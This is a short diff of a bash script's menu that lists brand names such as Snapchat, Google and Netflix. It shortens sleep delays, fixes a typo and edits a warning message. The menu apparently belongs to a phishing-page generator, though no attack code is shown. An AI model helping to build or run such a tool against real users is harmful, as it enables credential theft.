@@ -26,19 +26,19 @@ echo ''
 sleep 0.5s
 echo -e "\e[38;5;208m3⟩Snapchat\e"
 echo ''
-sleep 1s
+sleep 0.5s
 echo -e "\e[38;5;25m4⟩Twitter\e"
 echo ''
-sleep 1s
-echo -e "\e[38;5;134m5⟩Githun\e"
+sleep 0.5s
+echo -e "\e[38;5;134m5⟩Github\e"
 echo ''
-sleep 1s
+sleep 0.5s
 echo -e "\e[38;5;207m6⟩Google\e"          
 echo ''
-sleep 1s
+sleep 0.5s
 echo -e "\e[38;5;118m7⟩Spotify\e"
 echo ''
-sleep 1s
+sleep 0.5s
 echo -e "\e[38;5;9m8⟩Netflix\e"
 echo ''
 
@@ -125,7 +125,7 @@ elif [[ $option == 99 ]]; then
 exit 1
 
 else
-echo -e "\e[1;31;15m[⚠️] 𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒊𝒏𝒑𝒖𝒕 ! 𝑷𝒍𝒆𝒂𝒔𝒆 𝑰𝒏𝒑𝒖𝒕 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓... \e[0m"
+echo -e "\e[1;31;15m[⚠️] Invalid input! 𝑷𝒍𝒆𝒂𝒔𝒆 𝑰𝒏𝒑𝒖𝒕 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓... \e[0m"
 sleep 3s
 clear
 menu
